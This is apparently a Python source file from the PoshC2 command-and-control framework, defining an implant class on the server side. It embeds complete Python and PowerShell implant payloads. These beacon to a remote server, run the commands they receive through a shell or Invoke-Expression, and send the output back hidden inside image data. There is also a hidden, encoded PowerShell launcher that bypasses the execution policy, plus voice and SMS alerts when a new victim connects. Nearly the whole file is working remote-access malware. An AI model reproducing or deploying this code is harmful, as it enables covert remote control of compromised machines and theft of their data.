#!/usr/bin/env python

from DB import *
from Colours import *
from Core import *
from AutoLoads import *
from ImplantHandler import *
import urllib2

class Implant(object):

  def __init__(self, ipaddress, pivot, domain, user, hostname, arch, pid, proxy):
    self.RandomURI = randomuri()
    self.User = user
    self.Hostname = hostname
    self.IPAddress = ipaddress
    self.Key = gen_key()
    self.FirstSeen = (datetime.datetime.now()).strftime("%m/%d/%Y %H:%M:%S")
    self.LastSeen = (datetime.datetime.now()).strftime("%m/%d/%Y %H:%M:%S")
    self.PID = pid
    self.Proxy = proxy
    self.Arch = arch
    self.Domain = domain
    self.Alive = "Yes"
    self.UserAgent = get_defaultuseragent()
    self.Sleep = get_defaultbeacon()
    self.ModsLoaded = ""
    self.Pivot = pivot
    self.KillDate = get_killdate()
    self.ServerURL = new_serverurl = select_item("HostnameIP", "C2Server")
    self.AllBeaconURLs = get_otherbeaconurls()
    self.AllBeaconImages = get_images()
    self.PythonCore = """import urllib2, os, subprocess, re, datetime, time, base64, string, random

timer = %s
icoimage = [%s]
urls = [%s]
killdate = "%s"
useragent = ""

def get_encryption( key, iv='0123456789ABCDEF' ):  
  from Crypto.Cipher import AES
  aes = AES.new( base64.b64decode(key), AES.MODE_CBC, iv )
  return aes

def decrypt( key, data ):
  iv = data[0:16]
  aes = get_encryption(key, iv)
  data =  aes.decrypt( base64.b64decode(data) )
  return data[16:]

def decrypt_bytes_gzip( key, data):
  iv = data[0:16]
  aes = get_encryption(key, iv)
  data =  aes.decrypt( data )
  import StringIO
  import gzip
  infile = StringIO.StringIO(data[16:])
  with gzip.GzipFile(fileobj=infile, mode="r") as f:
    data = f.read()
  return data

def encrypt( key, data, gzip=False ):
  if gzip:
    import StringIO
    import gzip
    out = StringIO.StringIO()
    with gzip.GzipFile(fileobj=out, mode="w") as f:
      f.write(data)
    data = out.getvalue() 
  mod = len(data) %% 16
  if mod != 0:
    newlen = len(data) + (16-mod)
    data = data.ljust( newlen, '\\0' )
  aes = get_encryption(key)
  data = aes.IV + aes.encrypt( data )
  if not gzip:
    data = base64.b64encode( data )
  return data

while(True):
  # kill date stuff to add here
  key = "%s"
  uri = "%s"
  serverclean = "%s"
  server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
  try:
    time.sleep(timer)
    o = urllib2.build_opener()
    o.addheaders = [('User-Agent', '%s')]
    response = o.open(server)
    html = response.read()
  except Exception as e:
    E = e
    #print "error %%s" %% e
  #print html
  if html:
    try:
      returncmd = decrypt( key, html )
      returncmd = returncmd.rstrip('\\0')
      if "multicmd" in returncmd:
        returncmd = returncmd.replace("multicmd","")
        split = returncmd.split("!d-3dion@LD!-d")
        for cmd in split:
          print cmd
          if "$sleeptime" in cmd:
            timer = int(cmd.replace("$sleeptime = ",""))
          else:
            returnval = subprocess.check_output(cmd, shell=True)
            print returnval
            server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
            opener = urllib2.build_opener()
            postcookie = encrypt(key, cmd)
            data = base64.b64decode(random.choice(icoimage))
            dataimage = data.ljust( 1500, '\\0' )
            dataimagebytes = dataimage+(encrypt(key, returnval, gzip=True))
            opener.addheaders.append(('Cookie', "SessionID=%%s" %% postcookie))
            urllib2.install_opener(opener)
            req = urllib2.Request(server, dataimagebytes)
            response = urllib2.urlopen(req)

    except Exception as e:
      E = e
      #print "error %%s" %% e
      w = \"\"""" % (self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.Key, self.RandomURI, self.ServerURL, self.UserAgent)
    self.C2Core = """
$key="%s"
$global:sleeptime = '%s'

$payloadclear = @"
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`$true}
`$s="$s"
`$sc="$sc"
function DEC {${function:DEC}}
function ENC {${function:ENC}}
function CAM {${function:CAM}}
function Get-Webclient {${function:Get-Webclient}} 
function Primer {${function:primer}}
`$primer = primer
if (`$primer) {`$primer| iex} else {
start-sleep 1800
primer | iex }
"@

$ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($payloadclear)
$CompressedStream = New-Object IO.MemoryStream
$DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
$DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
$DeflateStream.Dispose()
$CompressedScriptBytes = $CompressedStream.ToArray()
$CompressedStream.Dispose()
$EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)
$NewScript = "sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String(`"$EncodedCompressedScript`"),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"
$UnicodeEncoder = New-Object System.Text.UnicodeEncoding
$EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($NewScript))
$payloadraw = "powershell -exec bypass -Noninteractive -windowstyle hidden -e $($EncodedPayloadScript)"
$payload = $payloadraw -replace "`n", ""

function GetImgData($cmdoutput) {
    $icoimage = @(%s)
    
    try {$image = $icoimage|get-random}catch{}

    function randomgen 
    {
        param (
            [int]$Length
        )
        $set = "...................@..........................Tyscf".ToCharArray()
        $result = ""
        for ($x = 0; $x -lt $Length; $x++) 
        {$result += $set | Get-Random}
        return $result
    }
    $imageBytes = [Convert]::FromBase64String($image)
    $maxbyteslen = 1500
    $maxdatalen = 1500 + ($cmdoutput.Length)
    $imagebyteslen = $imageBytes.Length
    $paddingbyteslen = $maxbyteslen - $imagebyteslen
    $BytePadding = [System.Text.Encoding]::UTF8.GetBytes((randomgen $paddingbyteslen))
    $ImageBytesFull = New-Object byte[] $maxdatalen    
    [System.Array]::Copy($imageBytes, 0, $ImageBytesFull, 0, $imageBytes.Length)
    [System.Array]::Copy($BytePadding, 0, $ImageBytesFull,$imageBytes.Length, $BytePadding.Length)
    [System.Array]::Copy($cmdoutput, 0, $ImageBytesFull,$imageBytes.Length+$BytePadding.Length, $cmdoutput.Length )
    $ImageBytesFull
}
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.RijndaelManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
    if ($IV.getType().Name -eq "String") {
    $aesManaged.IV = [System.Convert]::FromBase64String($IV)
    }
    else {
    $aesManaged.IV = $IV
    }
    }
    if ($key) {
    if ($key.getType().Name -eq "String") {
    $aesManaged.Key = [System.Convert]::FromBase64String($key)
    }
    else {
    $aesManaged.Key = $key
    }
    }
    $aesManaged
}

function Encrypt-String($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    #$aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}
function Encrypt-Bytes($key, $bytes) {
  [System.IO.MemoryStream] $output = New-Object System.IO.MemoryStream
  $gzipStream = New-Object System.IO.Compression.GzipStream $output, ([IO.Compression.CompressionMode]::Compress)
  $gzipStream.Write( $bytes, 0, $bytes.Length )
  $gzipStream.Close()
  $bytes = $output.ToArray()
  $output.Close()
  $aesManaged = Create-AesManagedObject $key 
  $encryptor = $aesManaged.CreateEncryptor() 
  $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
  [byte[]] $fullData = $aesManaged.IV + $encryptedData 
  $fullData
}
function Decrypt-String($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    #$aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}
function Encrypt-String2($key, $unencryptedString) {
    $unencryptedBytes = [system.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object System.IO.Compression.GzipStream $CompressedStream, ([IO.Compression.CompressionMode]::Compress)    
    $DeflateStream.Write($unencryptedBytes, 0, $unencryptedBytes.Length)
    $DeflateStream.Dispose()
    $bytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    $fullData
}
function Decrypt-String2($key, $encryptedStringWithIV) {
    $bytes = $encryptedStringWithIV
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor()
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16)
    $output = (New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$unencryptedData)), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd()
    $output
    #[System.Text.Encoding]::UTF8.GetString($output).Trim([char]0)
}
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}

$URI= "%s"
$Server = "$s/%s"
$ServerClean = "$sc"
while($true)
{
    $ServerURLS = "$($ServerClean)","$($ServerClean)"
    $date = (Get-Date -Format "dd/MM/yyyy")
    $date = [datetime]::ParseExact($date,"dd/MM/yyyy",$null)
    $killdate = [datetime]::ParseExact("%s","dd/MM/yyyy",$null)
    if ($killdate -lt $date) {exit}
    $sleeptimeran = $sleeptime, ($sleeptime * 1.1), ($sleeptime * 0.9)
    $newsleep = $sleeptimeran|get-random
    if ($newsleep -lt 1) {$newsleep = 5} 
    start-sleep $newsleep
    $URLS = %s
    $RandomURI = Get-Random $URLS
    $ServerClean = Get-Random $ServerURLS
    $G=[guid]::NewGuid()
    $Server = "$ServerClean/$RandomURI$G/?$URI"
    try { $ReadCommand = (Get-Webclient).DownloadString("$Server") } catch {}
    
    while($ReadCommand) {
        $RandomURI = Get-Random $URLS
        $ServerClean = Get-Random $ServerURLS
        $G=[guid]::NewGuid()
        $Server = "$ServerClean/$RandomURI$G/?$URI"
        try { $ReadCommandClear = Decrypt-String $key $ReadCommand } catch {}
        $error.clear()
        if (($ReadCommandClear) -and ($ReadCommandClear -ne "fvdsghfdsyyh")) {
            if  ($ReadCommandClear.ToLower().StartsWith("multicmd")) {
                    $splitcmd = $ReadCommandClear -replace "multicmd",""
                    $split = $splitcmd -split "!d-3dion@LD!-d"
                    foreach ($i in $split){
                        $RandomURI = Get-Random $URLS
                        $ServerClean = Get-Random $ServerURLS
                        $G=[guid]::NewGuid()
                        $Server = "$ServerClean/$RandomURI$G/?$URI"
                        $error.clear()
                        if ($i.ToLower().StartsWith("upload-file")) {
                            try {
                                $Output = Invoke-Expression $i | out-string
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
                                $ModuleLoaded = Encrypt-String $key $result
                                $Output = Encrypt-String2 $key $Output
                                $UploadBytes = getimgdata $Output
                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                            } catch {
                                $Output = "ErrorUpload: " + $error[0]
                            }
                        } elseif ($i.ToLower().StartsWith("download-file")) {
                            try {
                                Invoke-Expression $i | Out-Null
                            }
                            catch {
                                $Output = "ErrorLoadMod: " + $error[0]
                            }
                        } elseif ($i.ToLower().StartsWith("loadmodule")) {
                            try {
                                $modulename = $i -replace "LoadModule",""
                                $Output = Invoke-Expression $modulename | out-string  
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                                $Output = Encrypt-String2 $key $Output
                                $UploadBytes = getimgdata $Output
                                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                            } catch {
                                $Output = "ErrorLoadMod: " + $error[0]
                            }
                        } else {
                            try {
                                $Output = Invoke-Expression $i | out-string  
                                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                                $StdError = ($error[0] | Out-String)
                                if ($StdError){
                                $Output = $Output + $StdError
                                $error.clear()
                                }
                            } catch {
                                $Output = "ErrorCmd: " + $error[0]
                            }
                            try {
                            $Output = Encrypt-String2 $key $Output
                            $Response = Encrypt-String $key $i
                            $UploadBytes = getimgdata $Output
                            (Get-Webclient -Cookie $Response).UploadData("$Server", $UploadBytes)|out-null
                            } catch{}
                        }
                    } 
            }
            elseif ($ReadCommandClear.ToLower().StartsWith("upload-file")) {
                try {
                $Output = Invoke-Expression $ReadCommandClear | out-string
                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                if ($ReadCommandClear -match ("(.+)Base64")) { $result = $Matches[0] }
                $ModuleLoaded = Encrypt-String $key $result
                $Output = Encrypt-String2 $key $Output
                $UploadBytes = getimgdata $Output
                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                } catch {
                    $Output = "ErrorUpload: " + $error[0]
                }

            } elseif ($ReadCommandClear.ToLower().StartsWith("download-file")) {
                try {
                    Invoke-Expression $ReadCommandClear | Out-Null
                }
                catch {
                    $Output = "ErrorLoadMod: " + $error[0]
                }
            } elseif ($ReadCommandClear.ToLower().StartsWith("loadmodule")) {
                try {
                $modulename = $ReadCommandClear -replace "LoadModule",""
                $Output = Invoke-Expression $modulename | out-string  
                $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                $ModuleLoaded = Encrypt-String $key "ModuleLoaded"
                $Output = Encrypt-String2 $key $Output
                $UploadBytes = getimgdata $Output
                (Get-Webclient -Cookie $ModuleLoaded).UploadData("$Server", $UploadBytes)|out-null
                } catch {
                    $Output = "ErrorLoadMod: " + $error[0]
                }

            } else {
                try {
                    $Output = Invoke-Expression $ReadCommandClear | out-string  
                    $Output = $Output + "123456PS " + (Get-Location).Path + ">654321"
                    $StdError = ($error[0] | Out-String)
                    if ($StdError){
                    $Output = $Output + $StdError
                    $error.clear()
                    }
                } catch {
                    $Output = "ErrorCmd: " + $error[0]
                }
            try {
            $Output = Encrypt-String2 $key $Output
            $UploadBytes = getimgdata $Output
            (Get-Webclient -Cookie $ReadCommand).UploadData("$Server", $UploadBytes)|out-null
            } catch {}
            }
            $ReadCommandClear = $null
            $ReadCommand = $null
        }
    break
    }
}""" % (self.Key, self.Sleep, self.AllBeaconImages, self.RandomURI, self.RandomURI, self.KillDate, self.AllBeaconURLs)
#Add all db elements 

  def display(self):
    print Colours.GREEN,""
    print "New %s implant connected: (uri=%s key=%s)" % (self.Pivot, self.RandomURI, self.Key)
    print "%s | URL:%s | Time:%s | PID:%s | Sleep:%s | %s (%s) " % (self.IPAddress, self.Proxy, self.FirstSeen, 
      self.PID, self.Sleep, self.Domain, self.Arch)
    print "",Colours.END

    try:
      sound = select_item("Sounds","C2Server")
      if sound == "Yes":
        import pyttsx3
        engine = pyttsx3.init()
        rate = engine.getProperty('rate')
        voices = engine.getProperty('voices')
        engine.setProperty('voice', "english-us")
        engine.setProperty('rate', rate-30)
        engine.say("Nice, we have an implant")
        engine.runAndWait()
    except Exception as e:
      EspeakError = "espeak error"      

    try:
      apikey = select_item("APIKEY","C2Server")
      mobile = select_item("MobileNumber","C2Server")

      #import httplib, urllib
      #conn = httplib.HTTPSConnection("api.pushover.net:443")
      #conn.request("POST", "/1/messages.json",
      #  urllib.urlencode({
      #    "token": "",
      #    "user": "",
      #    "message": "NewImplant: %s @ %s" % (self.User,self.Hostname),
      #  }), { "Content-type": "application/x-www-form-urlencoded" })
      #conn.getresponse()

      if apikey and mobile:
        for number in mobile.split(","):
          number = number.replace('"','')
          url = "https://api.clockworksms.com/http/send.aspx?key=%s&to=%s&from=PoshC2&content=NewImplant:%s\%s @ %s" % (apikey, number, self.Domain,self.User,self.Hostname)
          url = url.replace(" ","+")
          response = urllib2.urlopen(url)
    except Exception as e:
      print "SMS send error: %s" % e
      
  def save(self):
    new_implant(self.RandomURI, self.User, self.Hostname, self.IPAddress, self.Key, self.FirstSeen, self.FirstSeen, self.PID, self.Proxy, self.Arch, self.Domain, self.Alive, self.Sleep, self.ModsLoaded, self.Pivot)

  def autoruns(self):
    new_task("loadmodule Implant-Core.ps1", self.RandomURI)
    update_mods("Implant-Core.ps1", self.RandomURI)
    result = get_autoruns()
    if result:
      autoruns = ""
      for autorun in result:
        new_task(autorun[1], self.RandomURI)